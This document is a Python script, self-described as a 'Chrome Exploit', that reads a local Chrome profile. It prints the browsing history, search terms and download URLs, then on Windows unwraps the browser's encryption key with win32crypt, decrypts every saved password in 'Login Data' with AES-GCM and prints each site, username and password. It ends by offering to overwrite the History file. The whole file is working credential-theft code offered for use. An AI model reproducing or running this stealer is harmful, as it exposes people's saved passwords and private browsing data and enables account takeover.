# Importing Library For Get And Decode Exploit
import sqlite3, os, getpass, sys




# Show Info Tools And Find Exploit Path And Print
print(f"""

   ___
 //   \\
||  E  ||
 \\___//

Chrome Exploit
  Exploit Get History
   Exploted By @BLACK_NICOLA

Exploit_Path : C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default
[VIP] Your Can Delete Exploit Of Your System
================================================

""")





# Check Type System
if os.name == 'nt':

    # Find Exploit Paths
    home_exploit = (f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
    path_exploit = (f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    # Check For Install Chrome
    try:
        os.chdir(home_exploit)
    except:
        print("Please Install Chrome!")
        sys.exit()
else:
    home_exploit = (f"/home/{getpass.getuser()}/.config/google-chrome/Default")
    path_exploit = (f"/home/{getpass.getuser()}/.config/google-chrome/Default/History")
    try:
        os.chdir(home_exploit)
    except:
        print("Please Install Chrome!")
        sys.exit()


# Connect And Get Exploit
try:
    db = sqlite3.connect(path_exploit)
except:
    print("Please Close Chrome And Open Tools Now.")
    sys.exit()
c = db.cursor()


# Decode SEARCH FRom Exploit
searchs = []
# Check For Find Exploit
try:
    c.execute("select term from keyword_search_terms")
except:
    print("Exploit Deleted!")
    sys.exit()
for item in c.fetchall():
    searchs.append(item[0])


# Decode URL FRom Exploit
urls = []
c.execute("select url from urls")
for item in c.fetchall():
    urls.append(item[0])


# Decode Download FRom Exploit
downloads = []
c.execute("select tab_url from downloads")
for item in c.fetchall():
    downloads.append(item[0])


## SHOW Information ##
print("Urls : ")
for url in urls:
    print("\t{}".format(url))


print("-"*50)
print("Downloaded Files :")
for download in downloads:
    print("\t{}".format(download))


print("-"*50)
print("Searchs : ")
for search in searchs:
    print("\t{}".format(search))





try:
    import json
    from base64 import b64decode
    try:
        import win32crypt
    except:
        print("Please Install win32crypt With ~pip install win32crypt~")
    import sqlite3 
    import shutil
    try:
        from Crypto.Cipher import AES
    except:
        print("Please InstallCrypto With ~pip install Crypto~")

    f = open(f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    local_state = json.loads(f.read())

    key = local_state["os_crypt"]["encrypted_key"]

    #  1
    key = b64decode(key) # Base 64 Decoder
    key = key[5:]
    #  2
    key = win32crypt.CryptUnprotectData(key)[1]
    ###########################################
    path = (f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\")
    shutil.copy(path+"Login Data" , path+"database2") # Copy Database

    database = sqlite3.connect(path+"database2")
    cursor = database.cursor()

    cursor.execute("select origin_url , username_value , password_value from logins")

    result = cursor.fetchall()

    def decrypt(password , key):
        iv = password[3:15]
        password = password[15:]
        
        cipher = AES.new(key , AES.MODE_GCM , iv)
        password = cipher.decrypt(password)
        password = password[:-16].decode()
        return password


    for i in result:
        url = i[0]
        username = i[1]
        password = decrypt(i[2] , key)
        print("{} : ".format(url))
        print("\tusername : {}".format(username))
        print("\tpassword : {}".format(password))
        print()

except:
    pass













# DElete Exploit
se = str(input("[VIP] Do You Want Delete It Exploit On Your System ? ( [Y]es/[N]o ): ")).lower()
if "y" in se:
    # Try For Delete Exploit
    try:
        open(path_exploit, "w+")
        print("[VIP] Deleted!")
    except:
        print("Error")

input("""


Enter For Close...         """)
sys.exit()
